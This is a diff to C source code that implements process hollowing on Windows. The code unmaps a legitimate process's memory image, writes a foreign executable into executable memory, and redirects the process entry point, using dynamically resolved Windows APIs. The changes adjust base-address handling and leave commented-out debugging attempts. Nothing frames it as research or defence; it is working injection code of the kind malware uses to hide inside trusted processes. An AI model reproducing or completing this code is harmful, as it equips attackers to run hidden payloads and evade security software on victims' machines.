@@ -47,10 +47,11 @@ PEB	*get_remote_peb(HANDLE *rproc)
         return (rpeb);
 }
 
-int	hijack_legit(LPPROCESS_INFORMATION rpi, PEB *rpeb, t_pe *pe)
+int	hijack_legit(LPPROCESS_INFORMATION rpi, PEB *rpeb, t_pe *pe, CINT *newbase)
 {	
 	LPVOID			hijackRemote;
 	LPVOID			virtaddr;
+	PIMAGE_NT_HEADERS	nthdr;
 	UNMAPVIEWOFSECTION	unmapview;
 	VIRTUALALLOCEX		virtalloc;
 	WRITEPROCESSMEM		writeprocmem;
@@ -58,20 +59,25 @@ int	hijack_legit(LPPROCESS_INFORMATION rpi, PEB *rpeb, t_pe *pe)
 	if (!(unmapview = (UNMAPVIEWOFSECTION)resolve_symbol(&g_fonctions[3])))
 		return (0);
 	if (unmapview(rpi->hProcess, rpeb->Reserved3[1]) != 0)
-		return (0);
+                return (0);
 	if (!(virtalloc = (VIRTUALALLOCEX)resolve_symbol(&g_fonctions[8])))
-		return (0);
-	if (!(hijackRemote = virtalloc(rpi->hProcess, rpeb->Reserved3[1], pe->nthdr.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
-		return (0);
+                return (0);
+	if (!(hijackRemote = virtalloc(rpi->hProcess, /*NULL*/rpeb->Reserved3[1], pe->nthdr.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
+                return (0);
+	*newbase = (CINT)rpeb->Reserved3[1];
+/*	*newbase = (CINT)hijackRemote;
+	nthdr = (PIMAGE_NT_HEADERS)(((PIMAGE_DOS_HEADER)pe->buffer)->e_lfanew + pe->buffer);
+	nthdr->OptionalHeader.ImageBase = (CINT)hijackRemote;
+	printf("%p\n", nthdr->OptionalHeader.ImageBase);*/
 	if (!(writeprocmem = (WRITEPROCESSMEM)resolve_symbol(&g_fonctions[9])))
-		return (0);
-	if (!writeprocmem(rpi->hProcess, rpeb->Reserved3[1], pe->buffer, pe->nthdr.OptionalHeader.SizeOfHeaders, NULL))
-		return (0);
+                return (0);
+	if (!writeprocmem(rpi->hProcess, /*hijackRemote*/rpeb->Reserved3[1], pe->buffer, pe->nthdr.OptionalHeader.SizeOfHeaders, NULL))
+                return (0);
 	for (size_t i = 0; i < pe->nbsect; i++)
 	{
 		if (pe->secthdr[i].SizeOfRawData)
 		{
-			virtaddr = rpeb->Reserved3[1] + pe->secthdr[i].VirtualAddress;
+			virtaddr = /*hijackRemote*/rpeb->Reserved3[1] + pe->secthdr[i].VirtualAddress;
 			if (!writeprocmem(rpi->hProcess, virtaddr, pe->sections[i], pe->secthdr[i].SizeOfRawData, NULL))
 				return (0);
 		}
@@ -79,7 +85,7 @@ int	hijack_legit(LPPROCESS_INFORMATION rpi, PEB *rpeb, t_pe *pe)
 	return (1);
 }
 
-int	set_new_eip(LPPROCESS_INFORMATION rpi, PEB *rpeb, t_pe *pe)
+int	set_new_eip(LPPROCESS_INFORMATION rpi, PEB *rpeb, t_pe *pe, CINT newbase)
 {
 	LPCONTEXT               rcontext;
 	GETTHREADCONTEXT        getthcontext;
@@ -94,7 +100,8 @@ int	set_new_eip(LPPROCESS_INFORMATION rpi, PEB *rpeb, t_pe *pe)
 		return (0);
 	if (!getthcontext(rpi->hThread, rcontext))
 		return (0);
-	rcontext->GPR_BX = (CINT) rpeb->Reserved3[1] + pe->nthdr.OptionalHeader.AddressOfEntryPoint;
+//	rcontext->GPR_BX = (CINT) newbase/*rpeb->Reserved3[1]*/ + pe->nthdr.OptionalHeader.AddressOfEntryPoint;
+        rcontext->Eax = (CINT) newbase/*rpeb->Reserved3[1]*/ + pe->nthdr.OptionalHeader.AddressOfEntryPoint;
 	if (!setthcontext(rpi->hThread, rcontext))
 		return (0);
 	free(rcontext);
@@ -103,6 +110,7 @@ int	set_new_eip(LPPROCESS_INFORMATION rpi, PEB *rpeb, t_pe *pe)
 
 int     process_hollow(WCHAR *legitproc, t_pe *pe)
 {
+	CINT			newbase;
 	PEB			*remotepeb;
 	LPPROCESS_INFORMATION   pi;
 
@@ -112,11 +120,11 @@ int     process_hollow(WCHAR *legitproc, t_pe *pe)
 		return (0);
 	if ((remotepeb = get_remote_peb(pi->hProcess)))
 	{
-		if (hijack_legit(pi, remotepeb, pe))
+		if (hijack_legit(pi, remotepeb, pe, &newbase))
 		{
-			if (set_new_eip(pi, remotepeb, pe))
+			if (set_new_eip(pi, remotepeb, pe, newbase))
 			{
-				debug_son(pi, (CINT)remotepeb->Reserved3[1]);
+				debug_son(pi, (CINT)newbase/*remotepeb->Reserved3[1]*/);
 				free(pi);
 				free(remotepeb);
 				return (1);
